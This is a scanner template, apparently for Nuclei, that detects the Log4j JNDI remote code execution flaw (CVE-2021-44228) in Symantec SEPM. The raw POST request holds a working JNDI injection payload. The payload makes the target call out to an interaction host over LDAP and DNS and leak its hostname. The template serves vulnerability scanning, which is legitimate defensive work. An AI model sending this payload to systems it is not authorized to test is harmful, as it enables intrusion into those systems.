id: symantec-sepm-log4j-rce

info:
  name: Symantec SEPM - Remote Code Execution (Apache Log4j)
  author: shaikhyaser, yaser_s
  severity: critical
  description: |
    Symantec SPEM is susceptible to Log4j JNDI remote code execution. 
  reference:
    - https://support.broadcom.com/security-advisory/content/security-advisories/Symantec-Security-Advisory-for-Log4j-2-CVE-2021-44228-Vulnerability/SYMSA19793
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
    cvss-score: 10
    cve-id: CVE-2021-44228
    cwe-id: CWE-77
  metadata:
    verified: true
    max-request: 1
  tags: cve,cve2021,rce,jndi,log4j,symantec,oast,kev
variables:
  rand1: '{{rand_int(111, 999)}}'
  rand2: '{{rand_int(111, 999)}}'

http:
  - raw:
      - |
        POST /console/apps/sepm HTTP/1.1
        Host: {{Hostname}}
        Cookie: cookieTest=true;
        Origin: {{RootURL}}
        Referer: {{RootURL}}/console/apps/sepm
        X-Requested-With: XMLHttpRequest
        Content-Type: application/x-www-form-urlencoded

        actionString=%2Fnoupdate%2FSEPMPasswordField_118937502%2F&storedActions%5B%5D=%2Ftype%2FSEPMPasswordField_118937502%2F${jndi:ldap://${:-{{rand1}}}${:-{{rand2}}}.${hostName}.username.{{interactsh-url}}/test}&__Action=v4&__FastSubmit=true

    matchers-condition: and
    matchers:
      - type: word
        part: interactsh_protocol #Confirms the DNS Interaction
        words:
          - "dns"

      - type: regex
        part: interactsh_request
        regex:
          - '\d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+' #Print extracted ${:-{{rand1}}}${:-{{rand2}}}.${hostName} in output

    extractors:
      - type: kval
        kval:
          - interactsh_ip #Print remote interaction IP in output

      - type: regex
        group: 2
        regex:
          - '\d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+' #Print injection point in output
        part: interactsh_request

      - type: regex
        group: 1
        regex:
          - '\d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+' #Print extracted ${:-{{rand1}}}${:-{{rand2}}}.${hostName} in output
        part: interactsh_request
